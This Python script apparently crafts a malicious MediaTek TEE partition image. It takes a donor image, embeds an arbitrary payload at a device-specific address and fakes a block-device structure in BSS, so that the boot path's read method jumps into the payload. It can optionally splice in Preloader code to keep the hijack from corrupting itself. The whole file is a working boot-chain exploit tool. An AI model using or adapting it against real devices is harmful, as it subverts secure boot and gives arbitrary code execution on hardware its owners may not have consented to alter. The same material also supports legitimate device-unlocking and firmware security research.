#!/usr/bin/env python3

import re
import struct

from pathlib import Path
from argparse import ArgumentParser
from types import SimpleNamespace

from liblk import LkImage as MtkImage

DEVICE_DIR = Path(__file__).resolve().parent / "include" / "devices"
DEVICE_FIELDS = ("PAYLOAD_ADDR", "BSS_START", "DRAM_BUF", "BDEV_ADDR",
                 "SRAM_DBUF_PTR")

def read_defines(path):
    defines = {}
    for name, value in re.findall(r"^#define\s+(\w+)\s+(\S+)", path.read_text(), re.M):
        defines[name] = int(value, 16) if value.startswith("0x") else value
    return defines

def platform_define(defines, name):
    platform = defines.get("PLATFORM")
    if not platform:
        return None
    header = DEVICE_DIR.parents[1] / "platform" / platform / "include" / "platform.h"
    return read_defines(header).get(name) if header.is_file() else None

def load_device(name):
    header = DEVICE_DIR / ("%s.h" % name)
    if not header.is_file():
        raise ValueError("Unknown device '%s', no %s" % (name, header))

    defines = read_defines(header)
    missing = [field for field in DEVICE_FIELDS if field not in defines]
    if missing:
        raise ValueError("%s does not define %s" % (header, ", ".join(missing)))

    device = SimpleNamespace(name=name)
    for field in DEVICE_FIELDS:
        setattr(device, field.lower(), defines[field])

    device.platform = defines.get("PLATFORM")
    device.preloader_base = platform_define(defines, "PRELOADER_BASE")

    device.read_method = device.bdev_addr + 0x20
    device.data_size = ((device.read_method + 4 + 0x1FF) & ~0x1FF) + 4

    return device

def build_bss(device):
    bss = bytearray(device.data_size - device.bss_start)

    def poke(addr, value):
        struct.pack_into("<I", bss, addr - device.bss_start, value)

    poke(device.bss_start, device.bdev_addr)                   # device list head
    poke(device.bdev_addr + 0x00, 1)                           # id
    poke(device.bdev_addr + 0x04, 0x200)                       # block size
    poke(device.bdev_addr + 0x14, device.dram_buf + 0x48800)   # bounce buffer
    poke(device.bdev_addr + 0x1C, 0)                           # next
    poke(device.read_method, device.payload_addr | 1)          # payload

    # Preserve g_dram_buf pointer if required.
    if device.bss_start <= device.sram_dbuf_ptr < device.data_size:
        poke(device.sram_dbuf_ptr, device.dram_buf)

    return bytes(bss)

def find_partition(img, name):
    for key in img.partitions:
        if key.lower() == name.lower():
            return img.partitions[key]
    return None

def preloader_text(data, base_hint=None):
    for off in range(0, min(len(data), 0x10000) - 8, 4):
        word, _size, gfh_type = struct.unpack_from("<I2H", data, off)
        if word & 0xFFFFFF == 0x4D4D4D and gfh_type == 0:  # FILE_INFO
            load_addr, file_len, _max, content, sig = \
                struct.unpack_from("<5I", data, off + 28)
            return load_addr + content, data[off + content:off + file_len - sig]
    if base_hint is None:
        raise ValueError("Unable to find Preloader text segment!")
    return base_hint, data

def main():
    parser = ArgumentParser()

    parser.add_argument("donor", type=Path, help="The donor TEE to use as a base")
    parser.add_argument("payload", type=Path, help="The payload to embed into the donor TEE")
    parser.add_argument("output", type=Path, nargs="?", default=Path("tz.img"),
                        help="Where to write the crafted TEE (default: tz.img)")
    parser.add_argument("-d", "--device", default="checkers",
                        help="Device to craft the image for (default: checkers)")
    parser.add_argument("-p", "--preloader", type=Path, default=None,
                        help="Preloader image spliced over the overwritten code")

    args = parser.parse_args()

    device = load_device(args.device)

    img = MtkImage(args.donor)
    tee = find_partition(img, "tee")
    if find_partition(img, "atf") is None or tee is None:
        raise ValueError("Donor TEE image must contain both 'ATF' and 'TEE' partitions")

    print("Device: %s (%s)" % (device.name, device.platform))
    print("Donor TEE image: %s" % args.donor)
    print("BSS start: 0x%X" % device.bss_start)

    payload = args.payload.read_bytes()
    if device.payload_addr + len(payload) > device.bss_start:
        raise ValueError("Payload is too large (%d bytes)" % len(payload))

    print("Payload: %s (%d bytes)" % (args.payload, len(payload)))

    print("Original TEE size: 0x%X bytes" % tee.header.data_size)
    if len(tee.data) < device.data_size:
        raise ValueError("TEE partition is too small (0x%x bytes)" % len(tee.data))

    data = bytearray(tee.data[:device.data_size])

    # Some platforms load the Preloader low enough that this image, copied to
    # address 0, runs over its own live .text and corrupts the read path before
    # our hook can fire. Splice in a Preloader image to avoid this, if provided.
    if args.preloader is not None:
        base, text = preloader_text(args.preloader.read_bytes(), device.preloader_base)
        print("Preloader base: 0x%X, size: 0x%X bytes" % (base, len(text)))
        if base + len(text) > device.payload_addr:
            raise ValueError("Preloader overruns the payload")
        data[base:base + len(text)] = text

    data[device.payload_addr:device.payload_addr + len(payload)] = payload
    data[device.bss_start:] = build_bss(device)

    tee.data = bytes(data)
    tee.header.name = "lk"
    tee.header.memory_address = 0xFFFFFFFF

    print("Crafted TEE size: 0x%X bytes" % tee.header.data_size)

    args.output.write_bytes(b"".join(bytes(part) for part in img.partitions.values()))
    print("Crafted TEE image written to: %s" % args.output)

if __name__ == "__main__":
    main()
